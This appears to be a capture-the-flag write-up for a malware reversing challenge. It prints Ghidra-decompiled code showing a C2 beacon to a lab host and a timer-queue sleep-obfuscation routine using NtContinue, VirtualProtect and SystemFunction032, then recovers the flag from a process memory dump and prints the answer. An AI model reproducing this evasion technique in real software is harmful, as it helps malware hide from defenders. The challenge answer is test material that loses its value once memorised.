## Name: eepy
#### Author: @HuskyHacks
#### Category: Malware
#### Difficulty: N/D
#### Description: \*yawn\* why am i so eeeeeeeeepy?

Archive password: infected

## Procedure
Starting with reverse engineer for the exe file using [dogbolt](https://dogbolt.org/?id=96ef5bc5-0daf-46ce-98a6-fec855cf2a33#Ghidra=1292), here we can see the function ```FUN_140002d90``` this have a loop calling functions  ```FUN_140002d00``` and ```FUN_140002840```

```
void FUN_140002d90(void)
{
  FUN_140001620();
  do {
    FUN_140002d00();
    FUN_140002840(4000);
  } while( true );
}
```

the code for function ```FUN_140002d00```

```
undefined8 FUN_140002d00(void)
{
  longlong lVar1;
  longlong lVar2;
  undefined8 uVar3;
  
  lVar1 = InternetOpenA("Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:130.0) Gecko/20100101 Firefox/130.0"
                        ,1,0,0,0);
  uVar3 = 0;
  if (lVar1 != 0) {
    lVar2 = InternetOpenUrlA(lVar1,"http://supermegasus.huntress.local/c2",0,0,0x80000000,0);
    if (lVar2 == 0) {
      InternetCloseHandle(lVar1);
      uVar3 = 0;
    }
    else {
      InternetCloseHandle(lVar2);
      InternetCloseHandle(lVar1);
      uVar3 = 1;
    }
  }
  return uVar3;
}
```

this create a request for ```http://supermegasus.huntress.local/c2```, nothing interesting to see here. then we have the function ```FUN_140002840``` this create a timer queue using CreateTimerQueueTimer, with NtContinue possibly being used as a callback.

```
void FUN_140002840(uint param_1)

{
  PHANDLE phNewTimer;
  int iVar1;
  undefined4 uVar2;
  uint uVar3;
  undefined8 uVar4;
  undefined8 uVar5;
  longlong lVar6;
  BOOL BVar7;
  ulonglong uVar8;
  HANDLE hHandle;
  HANDLE TimerQueue;
  HMODULE pHVar9;
  WAITORTIMERCALLBACK Callback;
  FARPROC pFVar10;
  longlong lVar11;
  undefined *puVar12;
  undefined1 *puVar13;
  undefined4 *puVar14;
  undefined4 *puVar15;
  undefined4 *puVar16;
  LPCWSTR lpName;
  uint local_res8 [2];
  undefined8 auStackX_10 [2];
  uint uStackX_24;
  undefined8 uStack_48;
  
  uStack_48 = 0x14000285d;
  uVar8 = FUN_140002610();
  lpName = (LPCWSTR)0x0;
  BVar7 = 0;
  lVar6 = -uVar8;
  *(undefined4 *)(&stack0x0000003c + lVar6) = 0;
  phNewTimer = (PHANDLE)(&stack0x00000040 + lVar6);
  puVar15 = (undefined4 *)(&stack0x00000090 + lVar6);
  for (lVar11 = 0x134; lVar11 != 0; lVar11 = lVar11 + -1) {
    *puVar15 = 0;
    puVar15 = puVar15 + 1;
  }
  *(undefined8 *)(&stack0x00000040 + lVar6) = 0;
  puVar15 = (undefined4 *)(&stack0x00000560 + lVar6);
  for (lVar11 = 0x134; lVar11 != 0; lVar11 = lVar11 + -1) {
    *puVar15 = 0;
    puVar15 = puVar15 + 1;
  }
  puVar15 = (undefined4 *)(&stack0x00000a30 + lVar6);
  for (lVar11 = 0x134; lVar11 != 0; lVar11 = lVar11 + -1) {
    *puVar15 = 0;
    puVar15 = puVar15 + 1;
  }
  puVar15 = (undefined4 *)(&stack0x00000f00 + lVar6);
  for (lVar11 = 0x134; lVar11 != 0; lVar11 = lVar11 + -1) {
    *puVar15 = 0;
    puVar15 = puVar15 + 1;
  }
  puVar15 = (undefined4 *)(&stack0x000013d0 + lVar6);
  for (lVar11 = 0x134; lVar11 != 0; lVar11 = lVar11 + -1) {
    *puVar15 = 0;
    puVar15 = puVar15 + 1;
  }
  puVar15 = (undefined4 *)(&stack0x000018a0 + lVar6);
  for (lVar11 = 0x134; lVar11 != 0; lVar11 = lVar11 + -1) {
    *puVar15 = 0;
    puVar15 = puVar15 + 1;
  }
  puVar15 = (undefined4 *)(&stack0x00001d70 + lVar6);
  for (lVar11 = 0x134; lVar11 != 0; lVar11 = lVar11 + -1) {
    *puVar15 = 0;
    puVar15 = puVar15 + 1;
  }
  puVar13 = &DAT_140003020;
  puVar12 = &stack0x0000006a + lVar6;
  for (lVar11 = 0x26; lVar11 != 0; lVar11 = lVar11 + -1) {
    *puVar12 = *puVar13;
    puVar13 = puVar13 + 1;
    puVar12 = puVar12 + 1;
  }
  puVar12 = &stack0x0000006a + lVar6;
  *(undefined8 *)((longlong)&uStack_48 + lVar6) = 0x140002918;
  local_res8[0] = param_1;
  FUN_140002830((longlong)puVar12,0x26);
  *(undefined **)(&stack0x00000050 + lVar6) = puVar12;
  *(undefined8 *)(&stack0x00000048 + lVar6) = 0x2600000026;
  *(undefined8 *)((longlong)&uStack_48 + lVar6) = 0x14000293c;
  hHandle = CreateEventW((LPSECURITY_ATTRIBUTES)0x0,0,BVar7,lpName);
  *(undefined8 *)((longlong)&uStack_48 + lVar6) = 0x140002945;
  TimerQueue = CreateTimerQueue();
  *(undefined8 *)((longlong)&uStack_48 + lVar6) = 0x140002958;
  pHVar9 = GetModuleHandleA("Ntdll");
  *(undefined8 *)((longlong)&uStack_48 + lVar6) = 0x14000296b;
  Callback = (WAITORTIMERCALLBACK)GetProcAddress(pHVar9,"NtContinue");
  *(undefined8 *)((longlong)&uStack_48 + lVar6) = 0x14000297b;
  pHVar9 = LoadLibraryA("Advapi32");
  *(undefined8 *)((longlong)&uStack_48 + lVar6) = 0x140002987;
  pFVar10 = GetProcAddress(pHVar9,"SystemFunction032");
  *(FARPROC *)((longlong)auStackX_10 + lVar6 + 8) = pFVar10;
  *(undefined8 *)((longlong)&uStack_48 + lVar6) = 0x140002990;
  pHVar9 = GetModuleHandleA((LPCSTR)0x0);
  iVar1 = pHVar9[0xf].unused;
  *(HMODULE *)(&stack0x00000060 + lVar6) = pHVar9;
  uVar2 = *(undefined4 *)((longlong)&pHVar9[0x14].unused + (longlong)iVar1);
  *(HMODULE *)((longlong)auStackX_10 + lVar6) = pHVar9;
  *(undefined4 *)(&stack0xfffffffffffffff0 + lVar6) = 0x20;
  *(undefined4 *)((longlong)&uStackX_24 + lVar6) = uVar2;
  *(undefined4 *)(&stack0x0000005c + lVar6) = uVar2;
  *(undefined4 *)(&stack0x00000058 + lVar6) = uVar2;
  *(undefined **)(&stack0x00000028 + lVar6) = &stack0x00000090 + lVar6;
  *(undefined4 *)(&stack0xffffffffffffffe8 + lVar6) = 0;
  *(undefined4 *)(&stack0xffffffffffffffe0 + lVar6) = 0;
  *(undefined8 *)((longlong)&uStack_48 + lVar6) = 0x1400029fa;
  BVar7 = CreateTimerQueueTimer
                    (phNewTimer,TimerQueue,RtlCaptureContext_exref,&stack0x00000090 + lVar6,
                     *(DWORD *)(&stack0xffffffffffffffe0 + lVar6),
                     *(DWORD *)(&stack0xffffffffffffffe8 + lVar6),
                     *(ULONG *)(&stack0xfffffffffffffff0 + lVar6));
  if (BVar7 != 0) {
    *(undefined8 *)((longlong)local_res8 + lVar6) = *(undefined8 *)((longlong)auStackX_10 + lVar6);
    *(undefined **)(&stack0x00000000 + lVar6) = &stack0x00000560 + lVar6;
    *(code **)((longlong)auStackX_10 + lVar6) = WaitForSingleObject_exref;
    *(undefined8 *)((longlong)&uStack_48 + lVar6) = 0x140002a30;
    WaitForSingleObject(hHandle,0x32);
    puVar15 = *(undefined4 **)(&stack0x00000000 + lVar6);
    uVar4 = *(undefined8 *)((longlong)local_res8 + lVar6);
    uVar3 = *(uint *)((longlong)&uStackX_24 + lVar6);
    puVar14 = *(undefined4 **)(&stack0x00000028 + lVar6);
    puVar16 = puVar15;
    for (lVar11 = 0x134; lVar11 != 0; lVar11 = lVar11 + -1) {
      *puVar16 = *puVar14;
      puVar14 = puVar14 + 1;
      puVar16 = puVar16 + 1;
    }
    puVar14 = *(undefined4 **)(&stack0x00000028 + lVar6);
    puVar16 = (undefined4 *)(&stack0x00000a30 + lVar6);
    for (lVar11 = 0x134; lVar11 != 0; lVar11 = lVar11 + -1) {
      *puVar16 = *puVar14;
      puVar14 = puVar14 + 1;
      puVar16 = puVar16 + 1;
    }
    puVar14 = *(undefined4 **)(&stack0x00000028 + lVar6);
    puVar16 = (undefined4 *)(&stack0x00000f00 + lVar6);
    for (lVar11 = 0x134; lVar11 != 0; lVar11 = lVar11 + -1) {
      *puVar16 = *puVar14;
      puVar14 = puVar14 + 1;
      puVar16 = puVar16 + 1;
    }
    puVar14 = *(undefined4 **)(&stack0x00000028 + lVar6);
    puVar16 = (undefined4 *)(&stack0x000013d0 + lVar6);
    for (lVar11 = 0x134; lVar11 != 0; lVar11 = lVar11 + -1) {
      *puVar16 = *puVar14;
      puVar14 = puVar14 + 1;
      puVar16 = puVar16 + 1;
    }
    puVar14 = *(undefined4 **)(&stack0x00000028 + lVar6);
    puVar16 = (undefined4 *)(&stack0x000018a0 + lVar6);
    for (lVar11 = 0x134; lVar11 != 0; lVar11 = lVar11 + -1) {
      *puVar16 = *puVar14;
      puVar14 = puVar14 + 1;
      puVar16 = puVar16 + 1;
    }
    puVar14 = *(undefined4 **)(&stack0x00000028 + lVar6);
    puVar16 = (undefined4 *)(&stack0x00001d70 + lVar6);
    for (lVar11 = 0x134; lVar11 != 0; lVar11 = lVar11 + -1) {
      *puVar16 = *puVar14;
      puVar14 = puVar14 + 1;
      puVar16 = puVar16 + 1;
    }
    uVar5 = *(undefined8 *)((longlong)auStackX_10 + lVar6 + 8);
    *(undefined8 *)(&stack0x000005e0 + lVar6) = uVar4;
    *(ulonglong *)(&stack0x000005e8 + lVar6) = (ulonglong)uVar3;
    *(code **)(&stack0x00000658 + lVar6) = VirtualProtect_exref;
    *(undefined **)(&stack0x00000620 + lVar6) = &stack0x0000003c + lVar6;
    *(longlong *)(&stack0x000005f8 + lVar6) = *(longlong *)(&stack0x000005f8 + lVar6) + -8;
    *(longlong *)(&stack0x00000ac8 + lVar6) = *(longlong *)(&stack0x00000ac8 + lVar6) + -8;
    *(undefined8 *)(&stack0x00000618 + lVar6) = 4;
    *(undefined8 *)(&stack0x00000b28 + lVar6) = uVar5;
    *(ulonglong *)(&stack0x00001928 + lVar6) = (ulonglong)uVar3;
    *(ulonglong *)(&stack0x00000f88 + lVar6) = (ulonglong)local_res8[0];
    uVar5 = *(undefined8 *)((longlong)auStackX_10 + lVar6 + 8);
    *(undefined8 *)(&stack0x00000ff8 + lVar6) = *(undefined8 *)((longlong)auStackX_10 + lVar6);
    *(undefined8 *)(&stack0x00000028 + lVar6) = *(undefined8 *)((longlong)auStackX_10 + lVar6);
    *(undefined8 *)(&stack0x00001920 + lVar6) = uVar4;
    *(undefined **)(&stack0x00000ab8 + lVar6) = &stack0x00000048 + lVar6;
    *(undefined **)(&stack0x00001458 + lVar6) = &stack0x00000048 + lVar6;
    *(code **)(&stack0x00001998 + lVar6) = VirtualProtect_exref;
    *(undefined **)(&stack0x00001960 + lVar6) = &stack0x0000003c + lVar6;
    *(longlong *)(&stack0x00000f98 + lVar6) = *(longlong *)(&stack0x00000f98 + lVar6) + -8;
    *(longlong *)(&stack0x00001468 + lVar6) = *(longlong *)(&stack0x00001468 + lVar6) + -8;
    *(longlong *)(&stack0x00001938 + lVar6) = *(longlong *)(&stack0x00001938 + lVar6) + -8;
    *(longlong *)(&stack0x00001e08 + lVar6) = *(longlong *)(&stack0x00001e08 + lVar6) + -8;
    *(undefined **)(&stack0x00000ab0 + lVar6) = &stack0x00000058 + lVar6;
    *(undefined8 *)(&stack0x00000f80 + lVar6) = 0xffffffffffffffff;
    *(undefined8 *)(&stack0x000014c8 + lVar6) = uVar5;
    *(undefined **)(&stack0x00001450 + lVar6) = &stack0x00000058 + lVar6;
    *(undefined8 *)(&stack0x00001958 + lVar6) = 0x40;
    *(code **)(&stack0x00001e68 + lVar6) = SetEvent_exref;
    *(HANDLE *)(&stack0x00001df0 + lVar6) = hHandle;
    *(undefined4 *)(&stack0xfffffffffffffff0 + lVar6) = 0x20;
    *(undefined4 *)(&stack0xffffffffffffffe8 + lVar6) = 0;
    *(undefined4 *)(&stack0xffffffffffffffe0 + lVar6) = 100;
    *(undefined8 *)((longlong)&uStack_48 + lVar6) = 0x140002bf9;
    CreateTimerQueueTimer
              (phNewTimer,TimerQueue,Callback,puVar15,*(DWORD *)(&stack0xffffffffffffffe0 + lVar6),
               *(DWORD *)(&stack0xffffffffffffffe8 + lVar6),
               *(ULONG *)(&stack0xfffffffffffffff0 + lVar6));
    *(undefined4 *)(&stack0xfffffffffffffff0 + lVar6) = 0x20;
    *(undefined4 *)(&stack0xffffffffffffffe8 + lVar6) = 0;
    *(undefined4 *)(&stack0xffffffffffffffe0 + lVar6) = 200;
    *(undefined8 *)((longlong)&uStack_48 + lVar6) = 0x140002c25;
    CreateTimerQueueTimer
              (phNewTimer,TimerQueue,Callback,&stack0x00000a30 + lVar6,
               *(DWORD *)(&stack0xffffffffffffffe0 + lVar6),
               *(DWORD *)(&stack0xffffffffffffffe8 + lVar6),
               *(ULONG *)(&stack0xfffffffffffffff0 + lVar6));
    *(undefined4 *)(&stack0xfffffffffffffff0 + lVar6) = 0x20;
    *(undefined4 *)(&stack0xffffffffffffffe8 + lVar6) = 0;
    *(undefined4 *)(&stack0xffffffffffffffe0 + lVar6) = 300;
    *(undefined8 *)((longlong)&uStack_48 + lVar6) = 0x140002c51;
    CreateTimerQueueTimer
              (phNewTimer,TimerQueue,Callback,&stack0x00000f00 + lVar6,
               *(DWORD *)(&stack0xffffffffffffffe0 + lVar6),
               *(DWORD *)(&stack0xffffffffffffffe8 + lVar6),
               *(ULONG *)(&stack0xfffffffffffffff0 + lVar6));
    *(undefined4 *)(&stack0xfffffffffffffff0 + lVar6) = 0x20;
    *(undefined4 *)(&stack0xffffffffffffffe8 + lVar6) = 0;
    *(undefined4 *)(&stack0xffffffffffffffe0 + lVar6) = 400;
    *(undefined8 *)((longlong)&uStack_48 + lVar6) = 0x140002c7d;
    CreateTimerQueueTimer
              (phNewTimer,TimerQueue,Callback,&stack0x000013d0 + lVar6,
               *(DWORD *)(&stack0xffffffffffffffe0 + lVar6),
               *(DWORD *)(&stack0xffffffffffffffe8 + lVar6),
               *(ULONG *)(&stack0xfffffffffffffff0 + lVar6));
    *(undefined4 *)(&stack0xfffffffffffffff0 + lVar6) = 0x20;
    *(undefined4 *)(&stack0xffffffffffffffe8 + lVar6) = 0;
    *(undefined4 *)(&stack0xffffffffffffffe0 + lVar6) = 500;
    *(undefined8 *)((longlong)&uStack_48 + lVar6) = 0x140002ca9;
    CreateTimerQueueTimer
              (phNewTimer,TimerQueue,Callback,&stack0x000018a0 + lVar6,
               *(DWORD *)(&stack0xffffffffffffffe0 + lVar6),
               *(DWORD *)(&stack0xffffffffffffffe8 + lVar6),
               *(ULONG *)(&stack0xfffffffffffffff0 + lVar6));
    *(undefined4 *)(&stack0xfffffffffffffff0 + lVar6) = 0x20;
    *(undefined4 *)(&stack0xffffffffffffffe8 + lVar6) = 0;
    *(undefined4 *)(&stack0xffffffffffffffe0 + lVar6) = 600;
    *(undefined8 *)((longlong)&uStack_48 + lVar6) = 0x140002cd5;
    CreateTimerQueueTimer
              (phNewTimer,TimerQueue,Callback,&stack0x00001d70 + lVar6,
               *(DWORD *)(&stack0xffffffffffffffe0 + lVar6),
               *(DWORD *)(&stack0xffffffffffffffe8 + lVar6),
               *(ULONG *)(&stack0xfffffffffffffff0 + lVar6));
    *(undefined8 *)((longlong)&uStack_48 + lVar6) = 0x140002ce3;
    (**(code **)(&stack0x00000028 + lVar6))(hHandle,0xffffffff);
  }
  *(undefined8 *)((longlong)&uStack_48 + lVar6) = 0x140002cec;
  DeleteTimerQueue(TimerQueue);
  return;
}

```

The eepy.exe file still running, so i decided to get a DMP from the process.
<img width="1235" alt="Screenshot 2025-02-11 at 5 58 35 PM" src="https://github.com/user-attachments/assets/995e4cb4-92a1-4256-8602-73ceb69ca2b0" />

Then just tried to filter with the command ```type eepy.DMP | findstr flag{```, after that i was able to recover the flag.

<img width="1599" alt="Screenshot 2025-02-11 at 6 02 50 PM" src="https://github.com/user-attachments/assets/520d6c86-a7d0-4ae3-a793-4f57fd058824" />

flag ```flag{2feb3ff8a21a36db1ad386d33a29d85a}```

